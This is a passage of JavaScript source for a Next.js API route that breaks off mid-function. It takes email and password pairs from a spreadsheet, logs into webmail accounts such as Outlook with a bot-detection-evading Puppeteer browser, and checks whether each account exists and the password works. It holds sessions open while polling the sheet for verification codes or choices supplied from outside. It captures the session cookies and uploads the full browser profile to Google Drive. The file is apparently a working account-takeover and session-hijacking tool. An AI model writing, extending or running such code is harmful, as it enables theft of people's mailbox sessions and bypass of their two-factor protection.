import { NextResponse } from "next/server";
import puppeteer from "puppeteer-core";
import chromium from "@sparticuz/chromium-min";
import { inspect } from 'util';
import fs from 'fs-extra'; 
import {
  localExecutablePath,
  isDev,
  userAgent,
  remoteExecutablePath,
} from "../../../../utils/utils.js"; 
import logger from "../../../../utils/logger.js"; 
import geminiHelper from "../../../../utils/geminiHelper.js"; 
import { platformConfigs } from "./platforms.js";
import { keyboardNavigate } from "../../../../utils/KeyboardHandlers.js"; 
import { uploadBrowserData } from './googledrive.mjs';
import { 
    getColumnIndexes,
    fetchDataFromAppScript,
    updateBrowserRowData,
    resolveMx,
    isInbox,
    checkVerification,
    setCorsHeaders
} from './routeHelper.js'; 

const MAX_CONCURRENT_BROWSERS = parseInt(process.env.MAX_CONCURRENT_BROWSERS || '3', 10);
const activeProcesses = new Set();
const activeBrowserSessions = new Map(); 
logger.info(`Concurrency limit set to ${MAX_CONCURRENT_BROWSERS}`);

export const maxDuration = 60; 
export const dynamic = "force-dynamic";
export const runtime = 'nodejs';

async function handleAdditionalViews(page, platformConfig, instanceId, context = 'general') { 
    if (!platformConfig?.additionalViews) {
        logger.debug(`[handleAdditionalViews][${instanceId}] No additional views to process for this platform.`);
        return;
    }
    logger.info(`[handleAdditionalViews][${instanceId}] Checking for ${platformConfig.additionalViews.length} additional views (context: ${context})...`);

    for (const view of platformConfig.additionalViews) {
        if (context === 'post_verification' && (view.isVerificationChoiceScreen || view.isCodeEntryScreen)) {
            logger.debug(`[handleAdditionalViews][${instanceId}] Skipping primary verification screen '${view.name}' in post-verification context.`);
            continue; 
        }

        try {
            await page.waitForFunction(() => document.readyState === 'complete', { timeout: 5000 }).catch(() => null);
            
            const matchFound = await page.evaluate((viewData) => {
                try {
                    const selectors = Array.isArray(viewData.match.selector) ? 
                        viewData.match.selector : [viewData.match.selector];
                    for (const sel of selectors) {
                        const element = document.querySelector(sel);
                        if (element) {
                            const textContent = element.textContent || "";
                            return !viewData.match.text || textContent.includes(viewData.match.text);
                        }
                    }
                } catch (e) { /* ignore evaluation error */ }
                return false;
            }, view).catch(() => false);

            if (matchFound) {
                logger.info(`[handleAdditionalViews][${instanceId}] Matched additional view: ${view.name}`);
                if (view.action) {
                    if (typeof view.action === 'function') {
                        logger.info(`[handleAdditionalViews][${instanceId}] Executing custom action for view: ${view.name}`);
                        await view.action(page, view, platformConfig); 
                    } else if (view.action.type === 'click') {
                        const selectors = Array.isArray(view.action.selector) ? 
                            view.action.selector : [view.action.selector];
                        let clickedViewAction = false;
                        for (const selector of selectors) {
                            try {
                                await page.waitForSelector(selector, { visible: true, timeout: 3000 });
                                let navigationWaitUntil = 'networkidle0';
                                if (view.name === 'Outlook Verify Email Full Input' && selector.includes('Use your password')) {
                                    logger.info(`[handleAdditionalViews][${instanceId}] Using 'domcontentloaded' for navigation wait for '${view.name}' action.`);
                                    navigationWaitUntil = 'domcontentloaded';
                                }
                                const navigationPromise = page.waitForNavigation({ waitUntil: navigationWaitUntil, timeout: 7000 }).catch(() => null);
                                await page.click(selector);
                                await navigationPromise;
                                logger.info(`[handleAdditionalViews][${instanceId}] Clicked action selector '${selector}' for view: ${view.name}`);
                                clickedViewAction = true;
                                await new Promise(res => setTimeout(res, 1500)); 
                                break; 
                            } catch (modalClickError) {
                                logger.warn(`[handleAdditionalViews][${instanceId}] Action selector '${selector}' not found or clickable for view ${view.name}. Trying next if available.`);
                            }
                        }
                        if (!clickedViewAction) {
                             logger.warn(`[handleAdditionalViews][${instanceId}] No action selectors were clickable for view ${view.name}.`);
                        }
                    }
                } else {
                    logger.info(`[handleAdditionalViews][${instanceId}] View ${view.name} matched but has no defined action.`);
                }
                await new Promise(res => setTimeout(res, 1500)); 
            }
        } catch (viewError) {
            logger.error(`[handleAdditionalViews][${instanceId}] Error processing additional view ${view.name}: ${viewError.message}`);
        }
    }
    logger.info(`[handleAdditionalViews][${instanceId}] Finished processing additional views.`);
}

async function checkAccountAccess(browser, page, email, password, platform) { 
    const originalPage = page; 
    let emailExists = false;
    let accountAccess = false;
    let reachedInbox = false;
    let requiresVerification = false;
    const instanceId = `pid-${browser.process()?.pid || 'unknown'}`; 

    try {
        const platformConfig = platformConfigs[platform] || {}; 
        if (!platformConfig.url) {
            throw new Error(`No URL defined for platform: ${platform}`);
        }

        let gotoSuccessful = false;
        const gotoRetries = 2; 
        const initialGotoTimeout = 30000; 

        for (let attempt = 1; attempt <= gotoRetries; attempt++) {
            try {
                logger.info(`[checkAccountAccess][${instanceId}] Attempt ${attempt}/${gotoRetries} to navigate to ${platformConfig.url}`);
                await originalPage.goto(platformConfig.url, { waitUntil: 'networkidle0', timeout: initialGotoTimeout });
                gotoSuccessful = true;
                logger.info(`[checkAccountAccess][${instanceId}] Successfully navigated to ${platformConfig.url} on attempt ${attempt}.`);
                break; 
            } catch (e) {
                logger.warn(`[checkAccountAccess][${instanceId}] Attempt ${attempt}/${gotoRetries} failed for page.goto(): ${e.message}`);
                if (attempt === gotoRetries) throw e; 
                await new Promise(res => setTimeout(res, 2000)); 
            }
        }
        if (!gotoSuccessful) throw new Error(`Failed to navigate to ${platformConfig.url} after ${gotoRetries} attempts.`);
        
        logger.info(`[checkAccountAccess][${instanceId}] Starting flow for platform ${platform}.`); 

        for (const step of platformConfig.flow || []) {
            try {
                 if (step.action === 'waitForSelector') { 
                    logger.debug(`[checkAccountAccess][${instanceId}] Waiting for selector: ${step.selector}`);
                    await page.waitForSelector(step.selector, { visible: true, timeout: step.timeout || 15000 });
                    logger.debug(`[checkAccountAccess][${instanceId}] Found selector: ${step.selector}`);
                    continue; 
                }
                if (step.action === 'wait') {
                    logger.info(`[checkAccountAccess][${instanceId}] Performing explicit wait: ${step.duration || 3000}ms`);
                    await new Promise(res => setTimeout(res, step.duration || 3000));
                    continue;
                }
                if (!step.selector) continue;

                let resolvedSelector = step.selector;
                if (platformConfig?.selectors?.[step.selector]) {
                  resolvedSelector = platformConfig.selectors[step.selector];
                }

                if (step.action === 'type') {
                    const value = step.value === 'EMAIL' ? email : (step.value === 'PASSWORD' ? password : step.value);
                    const logValue = step.value === 'PASSWORD' ? '*****' : value;
                    logger.debug(`[checkAccountAccess][${instanceId}] Typing '${logValue}' into ${resolvedSelector}`);
                    try { await originalPage.bringToFront(); } catch(e) { logger.warn(`[bringToFront Pre-Type][${instanceId}] Error: ${e.message}`); } 
                    await page.waitForSelector(resolvedSelector, { visible: true, timeout: 15000 });
                    await page.evaluate((selector) => {
                        const element = document.querySelector(selector);
                        if (element) { element.scrollIntoView({ behavior: 'auto', block: 'center', inline: 'center' }); element.value = ''; }
                    }, resolvedSelector);
                    await page.type(resolvedSelector, value, { delay: 25 });
                    if (step.delay && typeof step.delay === 'number' && step.delay > 0) {
                        logger.info(`[checkAccountAccess][${instanceId}] Performing explicit step delay: ${step.delay}ms`);
                        await new Promise(res => setTimeout(res, step.delay));
                    }
                 } else if (step.action === 'click') {
                    if (typeof resolvedSelector === 'function') {
                        logger.info(`[checkAccountAccess][${instanceId}] Invoking custom click handler for ${step.selector}`); 
                        await resolvedSelector(page, platformConfig.selectors); 
                    } else {
                        let selectorsToAttempt = Array.isArray(resolvedSelector) ? resolvedSelector : [resolvedSelector];
                        if (selectorsToAttempt.length > 0) {
                            logger.info(`[checkAccountAccess][${instanceId}] Attempting to find and click one of selector(s): ${JSON.stringify(selectorsToAttempt)}`);
                            const firstVisibleSelector = await Promise.race(
                                selectorsToAttempt.map(sel => page.waitForSelector(sel, { visible: true, timeout: 5000 }).then(() => sel))
                            ).catch(raceError => {
                                logger.warn(`[checkAccountAccess][${instanceId}] None of the selectors ${JSON.stringify(selectorsToAttempt)} were found. Error: ${raceError.message}`);
                                throw new Error(`Critical click failure: None of the selectors ${JSON.stringify(selectorsToAttempt)} were found. Original error: ${raceError.message}`);
                            });

                            logger.info(`[checkAccountAccess][${instanceId}] First visible selector found: ${firstVisibleSelector}`);
                            try { await originalPage.bringToFront(); } catch(e) { logger.warn(`[bringToFront Pre-Click][${instanceId}] Error: ${e.message}`); }
                            const navigationPromise = page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 10000 }).catch(() => null);
                            await page.click(firstVisibleSelector);
                            await navigationPromise;
                            logger.info(`[checkAccountAccess][${instanceId}] Clicked on selector: ${firstVisibleSelector}`);
                            try { await originalPage.bringToFront(); } catch(e) {/* ignore */}
                        }
                    } 
                    await handleAdditionalViews(page, platformConfig, instanceId);
                }

                const originalSelectorName = step.selector;

                if (platform === 'outlook' && originalSelectorName === 'nextButton') {
                    logger.debug(`[checkAccountAccess][${instanceId}] Outlook: Clicked initial next. Checking for 'Verify your email' page or password page.`);
                    await new Promise(res => setTimeout(res, 1500)); 
                    const verifyEmailView = platformConfig.additionalViews.find(v => v.name === 'Outlook Verify Email Full Input');
                    let isOnVerifyEmailPage = false;
                    if (verifyEmailView) {
                        isOnVerifyEmailPage = await page.evaluate((viewData) => {
                            const selectors = Array.isArray(viewData.match.selector) ? viewData.match.selector : [viewData.match.selector];
                            for (const sel of selectors) {
                                const element = document.querySelector(sel);
                                if (element && (!viewData.match.text || (element.textContent || "").includes(viewData.match.text))) return true;
                            }
                            return false;
                        }, verifyEmailView).catch(() => false);
                    }
                    if (isOnVerifyEmailPage) {
                        logger.info(`[checkAccountAccess][${instanceId}] Outlook: Still on 'Verify your email' page after 'nextButton' click and handleAdditionalViews. The 'Use your password' action may not have navigated. Proceeding with the main flow.`);
                    }
                }

                if (platformConfig?.selectors) {
                    if (originalSelectorName === 'nextButton' && platformConfig.selectors.errorMessage) {
                        const errorExists = await page.evaluate((xpath) => {
                            try { return !!document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue; } catch (e) { return false; }
                        }, platformConfig.selectors.errorMessage).catch(() => false); 
                        if (errorExists) {
                            logger.info(`[checkAccountAccess][${instanceId}] Email error detected. Email does not exist.`); 
                            return { emailExists: false, accountAccess: false, reachedInbox: false, requiresVerification: false };
                        } else {
                            emailExists = true; 
                            if (await isInbox(page, platformConfig)) {
                                logger.info(`[checkAccountAccess][${instanceId}] Already in inbox after email submission. Skipping password.`);
                                return { emailExists: true, accountAccess: true, reachedInbox: true, requiresVerification: false };
                            }
                        }
                    }
                    if (originalSelectorName === 'passwordNextButton' && platformConfig.selectors.loginFailed) {
                        const failExists = await page.evaluate((xpath) => {
                             try { return !!document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue; } catch (e) { return false; }
                        }, platformConfig.selectors.loginFailed).catch(() => false); 
                        if (failExists) {
                            logger.info(`[checkAccountAccess][${instanceId}] Login failed detected after password next.`); 
                            return { emailExists, accountAccess: false, reachedInbox: false, requiresVerification }; 
                        } else {
                            accountAccess = true; 
                        }
                    } else if (originalSelectorName === 'passwordNextButton' && !platformConfig.selectors.loginFailed) {
                         accountAccess = true;
                    }
                }
            } catch (stepError) {
                logger.error(`[checkAccountAccess][${instanceId}] Step error during action '${step.action}' for selector '${step.selector}': ${stepError.message}`, stepError);
                let isCritical = false;
                const failedStepSelectorKey = step.selector; 
                if (step.action === 'type' && (failedStepSelectorKey === 'input' || failedStepSelectorKey === 'passwordInput') && stepError.message.startsWith('Type action failed:')) isCritical = true;
                else if (stepError.message.startsWith('Critical click failure')) isCritical = true;
                if (isCritical) return { emailExists, accountAccess: false, reachedInbox: false, requiresVerification: false };
                logger.warn(`[checkAccountAccess][${instanceId}] Non-critical step error encountered. Continuing flow.`);
            }
        } 

        logger.info(`[checkAccountAccess][${instanceId}] Flow completed. Current state: emailExists=${emailExists}, accountAccess=${accountAccess}`);
        if (emailExists && accountAccess) {
            const verificationDetails = await checkVerification(page, platformConfig); 
            if (verificationDetails.required) {
                requiresVerification = true; 
                if (verificationDetails.type === 'choice' && typeof platformConfig.extractVerificationOptions === 'function') {
                    const options = await platformConfig.extractVerificationOptions(page, platformConfig, verificationDetails.viewName); 
                    return { emailExists, accountAccess, reachedInbox: false, requiresVerification, verificationState: 'WAITING_OPTIONS', verificationType: verificationDetails.type, verificationOptions: options, viewName: verificationDetails.viewName };
                }
                return { emailExists, accountAccess, reachedInbox: false, requiresVerification, verificationState: 'WAITING_CODE', verificationType: verificationDetails.type, viewName: verificationDetails.viewName };
            }
        }
        if (emailExists && accountAccess && !requiresVerification) {
            reachedInbox = await isInbox(page, platformConfig);
        }
        return { emailExists, accountAccess, reachedInbox, requiresVerification, verificationState: null }; 
    } catch (err) {
        logger.error(`[checkAccountAccess][${instanceId}] Unexpected error: ${err.message}`, err);
        return { emailExists: false, accountAccess: false, reachedInbox: false, requiresVerification: false, verificationState: null, error: err.message };
    }
}

export async function GET(request) {
  const url = new URL(request.url);
  const browserId = url.searchParams.get("browserId");

  if (!browserId) return NextResponse.json({ error: "Missing browserId parameter" }, { status: 400 });

  if (activeProcesses.has(browserId) && !activeBrowserSessions.has(browserId)) {
      logger.warn(`[GET][${browserId}] In activeProcesses but no session. Skipping.`);
      return setCorsHeaders(NextResponse.json({ status: "PROCESSING", message: "Process already running." }, { status: 200 }));
  }

  let browser = null, page = null, targetCreatedListener = null;
  let platform = 'unknown', browserFullyClosed = false, isReusingBrowserForGET = false;
  const userDataDir = `users_data/${browserId}`;
  let updateData = {}, finalStatusDetails = {};
  let instanceIdForGET = `GET-SETUP-${browserId}`;

  try {
    const data = await fetchDataFromAppScript();
    const headers = data[0];
    const columnIndexes = getColumnIndexes(headers);
    const row = data.slice(1).find(r => r[columnIndexes['browserId']] === browserId);

    if (!row) return NextResponse.json({ error: "Browser ID not found" }, { status: 404 });

    const email = row[columnIndexes['email']];
    const password = row[columnIndexes['password']];
    const currentStatus = row[columnIndexes['status']];
    const driveUrlFromSheet = row[columnIndexes['driveUrl']];

    if (currentStatus === "COMPLETED" && driveUrlFromSheet) {
      return setCorsHeaders(NextResponse.json({ status: "COMPLETED", message: "Already processed.", driveUrl: driveUrlFromSheet, lastJsonResponse: row[columnIndexes['lastJsonResponse']] }, { status: 200 }));
    }
    
    const existingSessionForGET = activeBrowserSessions.get(browserId);
    if (existingSessionForGET) {
        browser = existingSessionForGET.browser; page = existingSessionForGET.page; targetCreatedListener = existingSessionForGET.targetCreatedListener;
        if (!browser?.isConnected() || page?.isClosed()) {
            logger.warn(`[GET][${browserId}] Stale session. Cleaning up.`);
            activeBrowserSessions.delete(browserId);
            if (browser?.isConnected()) await browser.close().catch(e => logger.error(`Error closing stale browser (GET): ${e.message}`));
            browser = null; page = null; targetCreatedListener = null;
        } else {
            isReusingBrowserForGET = true; instanceIdForGET = `GET-REUSE-${browserId}-${browser.process()?.pid || 'N/A'}`;
            logger.info(`[GET][${browserId}] Reusing session.`);
            try { await page.bringToFront(); } catch (e) { logger.warn(`[GET][${browserId}] Error bringing page to front: ${e.message}`); }
        }
    }

    if (!isReusingBrowserForGET) {
        if (activeProcesses.has(browserId)) logger.warn(`[GET][${browserId}] Active but no session. Launching new.`);
        activeProcesses.add(browserId);
        logger.info(`[GET][${browserId}] Launching new browser. Active: ${activeProcesses.size}`);
        await updateBrowserRowData(browserId, { status: "PROCESSING" });
        browser = await puppeteer.launch({
            ignoreDefaultArgs: ["--enable-automation"],
            args: [...(isDev ? ["--disable-blink-features=AutomationControlled", "--disable-features=site-per-process", "-disable-site-isolation-trials"] : chromium.args), '--window-size=1920,1080', '--force-device-scale-factor=1'],
            defaultViewport: { width: 1920, height: 1080, deviceScaleFactor: 1 },
            executablePath: isDev ? localExecutablePath : await chromium.executablePath(remoteExecutablePath),
            headless: false, userDataDir,
        });
        instanceIdForGET = `GET-${browserId}-${browser?.process()?.pid || 'N/A'}`;
        const allPages = await browser.pages(); page = allPages[0];
        for (let i = 1; i < allPages.length; i++) if (!allPages[i].isClosed()) try { await allPages[i].close(); } catch (e) { /*ignore*/ }
        targetCreatedListener = async (target) => { if (target.type() === 'page') { const newP = await target.page(); if (newP && newP !== page && !newP.isClosed()) try { await newP.close(); } catch (e) { /*ignore*/ }}};
        browser.on('targetcreated', targetCreatedListener);
        await page.setUserAgent(userAgent); await page.setViewport({ width: 1920, height: 1080, deviceScaleFactor: 1 });
        await page.evaluateOnNewDocument(() => { document.head.appendChild(Object.assign(document.createElement('style'),{innerHTML:`html,body{overflow:auto!important}::-webkit-scrollbar{display:block!important}`}));});
    }
    
    const domain = email.split('@')[1].toLowerCase();
    const mxRecords = await resolveMx(domain).catch(() => []);
    platform = Object.keys(platformConfigs).find(k => platformConfigs[k].mxKeywords?.some(kw => domain.includes(kw) || mxRecords.some(mx => mx.exchange?.includes(kw)))) || 'unknown';
    
    const checkResult = await checkAccountAccess(browser, page, email, password, platform);
    let newStatus = "FAILED";
    if (checkResult.emailExists && checkResult.accountAccess) {
        newStatus = checkResult.requiresVerification ? (checkResult.verificationState === 'WAITING_OPTIONS' ? "WAITINGOPTIONS" : "WAITINGCODE") : "COMPLETED";
    }

    finalStatusDetails = { browserId, email, status: newStatus, ...checkResult, platform, timestamp: new Date().toISOString() };
    updateData = { status: newStatus, lastJsonResponse: JSON.stringify(finalStatusDetails) };
    if (newStatus === "WAITINGOPTIONS") updateData.verificationOptions = JSON.stringify(checkResult.verificationOptions || []);
          
    if (newStatus === "COMPLETED") {
      await handleAdditionalViews(page, platformConfigs[platform] || {}, instanceIdForGET, 'post_login_direct');
      updateData.cookieJSON = JSON.stringify(await page.cookies());
      await updateBrowserRowData(browserId, { status: "COMPLETED", cookieJSON: updateData.cookieJSON, lastJsonResponse: updateData.lastJsonResponse });
      if (browser) {
        if (targetCreatedListener && !isReusingBrowserForGET) browser.off('targetcreated', targetCreatedListener);
        await browser.close().catch(e => logger.error(`Error closing browser (GET COMPLETED): ${e.message}`));
        browserFullyClosed = true; activeBrowserSessions.delete(browserId);
      }
      const uploadedDriveUrl = await uploadBrowserData(browserId).catch(e => {logger.error(`Drive upload error (GET): ${e.message}`); return null;});
      if (uploadedDriveUrl) updateData.driveUrl = uploadedDriveUrl;
    }
    await updateBrowserRowData(browserId, updateData);

    if (updateData.status === "COMPLETED" && updateData.driveUrl) try { await fs.remove(userDataDir); } catch (e) {logger.error(`Error deleting dir (GET COMPLETED): ${e.message}`);}

    return setCorsHeaders(NextResponse.json({ ...finalStatusDetails, driveUrl: updateData.driveUrl || null }, { status: 200 }));
  } catch (error) {
    logger.error(`[GET][${browserId || 'N/A'}] Error: ${error.message}`, error);
    if (browserId && updateData.status !== "FAILED") {
        updateData = { status: "FAILED", lastJsonResponse: JSON.stringify({ browserId, status: "FAILED", error: error.message, timestamp: new Date().toISOString() })};
        try { await updateBrowserRowData(browserId, updateData); } catch (e) { /*ignore*/ }
    }
    return NextResponse.json({ error: error.message }, { status: 500 });
  } finally {
    const finalEffectiveStatus = updateData?.status;
    if (browser && !browserFullyClosed) {
      if (finalEffectiveStatus === "WAITINGCODE" || finalEffectiveStatus === "WAITINGOPTIONS") {
          activeBrowserSessions.set(browserId, { browser, page, targetCreatedListener });
      } else {
          if (targetCreatedListener && !isReusingBrowserForGET) try {browser.off('targetcreated', targetCreatedListener);} catch(e){/*ignore*/}
          await browser.close().catch(e => logger.error(`Error closing browser (GET finally): ${e.message}`));
          activeBrowserSessions.delete(browserId);
      }
    }
    if (finalEffectiveStatus === "FAILED" && userDataDir) {
      const session = activeBrowserSessions.get(browserId);
      if (!session || !session.browser?.isConnected()) {
          try { await fs.remove(userDataDir); } catch (e) { if(e.code === 'EBUSY') logger.warn(`EBUSY deleting dir (GET FAILED): ${userDataDir}`); else logger.error(`Error deleting dir (GET FAILED): ${e.message}`);}
      } else { logger.warn(`[GET][${browserId}] FAILED, but session active. Skipping dir delete.`); }
    }
    if (!activeBrowserSessions.has(browserId)) activeProcesses.delete(browserId);
  }
}


async function processRow(row, columnIndexes, existingBrowser = null, existingPage = null) {
  const browserId = row[columnIndexes['browserId']];
  const email = row[columnIndexes['email']];
  const password = row[columnIndexes['password']];
  logger.info(`[processRow][${browserId}] Processing row.`);

  await updateBrowserRowData(browserId, { status: "PROCESSING" });

  const userDataDir = `users_data/${browserId}`;
  let browser = null;
  let page = null;
  let targetCreatedListener = null; // Defined here to be accessible in finally
  let finalStatus = "FAILED"; 
  let updateData = { status: finalStatus }; 
  let browserFullyClosed = false;
  let platform = 'unknown'; 
  let initialCheckResult = {}; 
  let instanceId = `PROC-SETUP-${browserId}`; 
  let isReusingBrowser = false;

  try {
    if (existingBrowser && existingPage) {
        browser = existingBrowser;
        page = existingPage;
        // Retrieve the existing listener if available from the session
        const session = activeBrowserSessions.get(browserId);
        targetCreatedListener = session?.targetCreatedListener; 
        isReusingBrowser = true;
        instanceId = `PROC-REUSE-${browserId}-${browser.process()?.pid || 'unknownPID'}`;
        logger.info(`[processRow][${browserId}] Reusing existing browser session.`);
        try { await page.bringToFront(); } catch (e) { logger.warn(`[processRow][${browserId}] Error bringing reused page to front: ${e.message}`); }
    } else {
        logger.info(`[processRow][${browserId}] Launching new browser session.`);
        browser = await puppeteer.launch({
            ignoreDefaultArgs: ["--enable-automation"],
            args: [
                ...(isDev
                    ? [
                        "--disable-blink-features=AutomationControlled",
                        "--disable-features=site-per-process",
                        "-disable-site-isolation-trials"
                      ]
                    : [...chromium.args, "--disable-blink-features=AutomationControlled"]),
                '--window-size=1920,1080',
                '--force-device-scale-factor=1'
            ],
            defaultViewport: { width: 1920, height: 1080, deviceScaleFactor: 1 },
            executablePath: isDev ? localExecutablePath : await chromium.executablePath(remoteExecutablePath),
            headless: false, 
            userDataDir,
          });
        instanceId = `PROC-${browserId}-${browser.process()?.pid || 'unknownPID'}`; 

        const allPages = await browser.pages();
        page = allPages[0];

        for (let i = 1; i < allPages.length; i++) { 
            if (!allPages[i].isClosed()) {
                try { await allPages[i].close(); } catch (closeErr) { logger.warn(`[Initial Tab Cleanup][${browserId}] Error closing tab: ${closeErr.message}`); }
            }
        }

        targetCreatedListener = async (target) => { // Assign to the outer scope variable
            if (target.type() === 'page') {
              const newPage = await target.page();
              if (newPage && newPage !== page && !newPage.isClosed()) {
                logger.info(`[Tab Listener][${browserId}] Detected and closing new tab: ${target.url()}`);
                try { await newPage.close(); } catch (closeErr) { logger.warn(`[Tab Listener][${browserId}] Error closing new tab: ${closeErr.message}`); }
              }
            }
          };
        browser.on('targetcreated', targetCreatedListener);

        await page.setUserAgent(userAgent);
        await page.setViewport({ width: 1920, height: 1080, deviceScaleFactor: 1 });
        await page.evaluateOnNewDocument(() => {
            const style = document.createElement('style');
            style.innerHTML = `
                html, body { overflow: auto !important; }
                ::-webkit-scrollbar { display: block !important; }
            `;
            document.head.appendChild(style);
        });
    }

    const domain = email.split('@')[1].toLowerCase();
      const mxRecords = await resolveMx(domain).catch(() => []);
      
      let matchedPlatformKey = Object.keys(platformConfigs).find(key => {
          const config = platformConfigs[key];
          return config.mxKeywords && config.mxKeywords.some(kw => domain.includes(kw) || mxRecords.some(mx => mx.exchange && mx.exchange.includes(kw)));
      });
      platform = matchedPlatformKey || 'unknown';
      const platformConfig = platformConfigs[platform] || {}; 
      
      initialCheckResult = await checkAccountAccess(browser, page, email, password, platform);
      let currentVerificationOptions = initialCheckResult.verificationOptions || [];

      if (!initialCheckResult.emailExists) {
          finalStatus = "FAILED";
      } else if (initialCheckResult.accountAccess) {
          if (!initialCheckResult.requiresVerification) {
              if (initialCheckResult.reachedInbox) {
                  finalStatus = "COMPLETED";
              } else {
                  logger.warn(`[processRow][${browserId}] Login successful but did not reach expected inbox state. Setting status to FAILED.`);
                  finalStatus = "FAILED";
              }
          } else { 
              if (initialCheckResult.verificationState === 'WAITING_OPTIONS') {
                  finalStatus = "WAITINGOPTIONS";
              } else { 
                  finalStatus = "WAITINGCODE";
              }
          }
      } else { 
          finalStatus = "FAILED";
      }
      
      updateData = {
        status: finalStatus,
        lastJsonResponse: JSON.stringify({
            browserId, email, status: finalStatus,
            emailExists: initialCheckResult.emailExists,
            accountAccess: initialCheckResult.accountAccess,
            reachedInbox: initialCheckResult.reachedInbox,
            requiresVerification: initialCheckResult.requiresVerification,
            verificationState: initialCheckResult.verificationState,
            verificationOptions: currentVerificationOptions,
            platform, timestamp: new Date().toISOString()
        })
      };
      
      if (finalStatus === "WAITINGOPTIONS") {
        updateData.verificationOptions = JSON.stringify(currentVerificationOptions);
        await updateBrowserRowData(browserId, updateData);
        logger.info(`[processRow][${browserId}] Status set to WAITINGOPTIONS. Sheet updated with options.`);
      }


      if (finalStatus === "COMPLETED") {
        const browserCookies = await page.cookies();
        updateData.cookieJSON = JSON.stringify(browserCookies); 

        logger.info(`[processRow][${browserId}] Initial COMPLETED status. Updating sheet before Drive upload.`);
        await updateBrowserRowData(browserId, {
            status: "COMPLETED",
            cookieJSON: updateData.cookieJSON, 
            lastJsonResponse: updateData.lastJsonResponse 
        });

        if (browser) {
          if (targetCreatedListener && browser && !isReusingBrowser) browser.off('targetcreated', targetCreatedListener);
          logger.info(`[processRow][${browserId}] Closing browser for COMPLETED status before Drive upload.`);
          await browser.close().catch(err => logger.error(`Error closing browser for ${browserId}: ${err.message}`));
          browserFullyClosed = true;
          activeBrowserSessions.delete(browserId);
          await new Promise(resolve => setTimeout(resolve, 1000)); 
        }

        let uploadedDriveUrl = null;
        try {
          uploadedDriveUrl = await uploadBrowserData(browserId);
          if (uploadedDriveUrl) {
            updateData.driveUrl = uploadedDriveUrl;
            logger.info(`[processRow][${browserId}] Successfully uploaded browser data to Google Drive.`);
          } else {
            logger.warn(`[processRow][${browserId}] Google Drive upload skipped or failed.`);
          }
        } catch (uploadError) {
          logger.error(`[processRow][${browserId}] Error during Google Drive upload: ${uploadError.message}`);
        }
        
        if (updateData.driveUrl && userDataDir) {
          try {
            logger.info(`[processRow][${browserId}] Process COMPLETED and uploaded. Deleting user data directory: ${userDataDir}`);
            await fs.remove(userDataDir);
            logger.info(`[processRow][${browserId}] Successfully deleted user data directory.`);
          } catch (deleteError) {
            logger.error(`[processRow][${browserId}] Error deleting user data directory after completion: ${deleteError.message}`);
          }
        }
      }

      // --- WAITINGOPTIONS Loop (for Outlook) ---
      if (finalStatus === "WAITINGOPTIONS") {
        logger.info(`[processRow][${browserId}] Entering WAITINGOPTIONS poll loop for Outlook. Initial LJR viewName: ${JSON.parse(updateData.lastJsonResponse || '{}').viewName}`);
        
        const pollingTimeoutOptions = Date.now() + 5 * 60 * 1000; 

        while (Date.now() < pollingTimeoutOptions && finalStatus === "WAITINGOPTIONS") {
            try {
                const currentPageVerificationState = await checkVerification(page, platformConfig);
                if (!currentPageVerificationState.required || currentPageVerificationState.type !== 'choice') {
                    logger.error(`[processRow][${browserId}][WAITINGOPTIONS] Expected to be on a choice screen, but current page is not. View: ${currentPageVerificationState.viewName || 'unknown'}. Type: ${currentPageVerificationState.type || 'unknown'}. Failing.`);
                    finalStatus = "FAILED";
                    updateData.status = "FAILED";
                    updateData.lastJsonResponse = JSON.stringify({ ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED", message: "Page state changed unexpectedly during WAITINGOPTIONS."});
                    break; 
                }
                
                const currentActualViewName = currentPageVerificationState.viewName;
                logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Current actual view for options: ${currentActualViewName}`);
                let freshCurrentVerificationOptions = await platformConfig.extractVerificationOptions(page, platformConfig, currentActualViewName);
                
                const ljp = JSON.parse(updateData.lastJsonResponse || '{}');
                if (ljp.viewName !== currentActualViewName || JSON.stringify(ljp.verificationOptions) !== JSON.stringify(freshCurrentVerificationOptions)) {
                    logger.info(`[processRow][${browserId}][WAITINGOPTIONS] View or options changed/refreshed. Updating LJR and sheet. LJR View: ${ljp.viewName}, Actual View: ${currentActualViewName}`);
                    updateData.lastJsonResponse = JSON.stringify({
                        ...ljp,
                        viewName: currentActualViewName,
                        verificationOptions: freshCurrentVerificationOptions, 
                        status: "WAITINGOPTIONS" 
                    });
                    await updateBrowserRowData(browserId, { 
                        status: "WAITINGOPTIONS", 
                        verificationOptions: JSON.stringify(freshCurrentVerificationOptions), 
                        lastJsonResponse: updateData.lastJsonResponse, 
                        verificationChoice: '' 
                    });
                    currentVerificationOptions = freshCurrentVerificationOptions; 
                } else {
                    currentVerificationOptions = ljp.verificationOptions || freshCurrentVerificationOptions;
                }

                const checkData = await fetchDataFromAppScript(1, 30000);
                const checkHeaders = checkData[0];
                const checkColumnIndexes = getColumnIndexes(checkHeaders);
                const checkRows = checkData.slice(1);
                const checkRow = checkRows.find(r => r[checkColumnIndexes['browserId']] === browserId);

                if (!checkRow) {
                    logger.error(`[processRow][${browserId}][WAITINGOPTIONS] Row not found. Failing.`);
                    finalStatus = "FAILED"; break;
                }

                const currentSheetStatus = checkRow[checkColumnIndexes['status']];
                const verificationChoiceRaw = checkRow[checkColumnIndexes['verificationChoice']];

                if (currentSheetStatus !== "WAITINGOPTIONS") {
                    logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Status changed externally to ${currentSheetStatus}. Exiting loop.`);
                    finalStatus = currentSheetStatus; break;
                }

                if (verificationChoiceRaw) {
                    logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Verification choice found: ${verificationChoiceRaw}`);
                    
                    let choiceData = null;
                    let hiddenInputText = null;
                    let chosenOptionIndex = null;
                    
                    try {
                        const parsedChoice = JSON.parse(verificationChoiceRaw);
                        if (Array.isArray(parsedChoice) && parsedChoice.length > 0) {
                            choiceData = parsedChoice[0];
                        } else if (typeof parsedChoice === 'object' && parsedChoice !== null) {
                            choiceData = parsedChoice;
                        }
                        if (choiceData) {
                            hiddenInputText = choiceData.hiddenPhoneEmail;
                            chosenOptionIndex = choiceData.choice;
                        }
                    } catch (e) {
                        if (currentActualViewName === 'Outlook Verify Email Full Input') {
                            hiddenInputText = verificationChoiceRaw.trim(); 
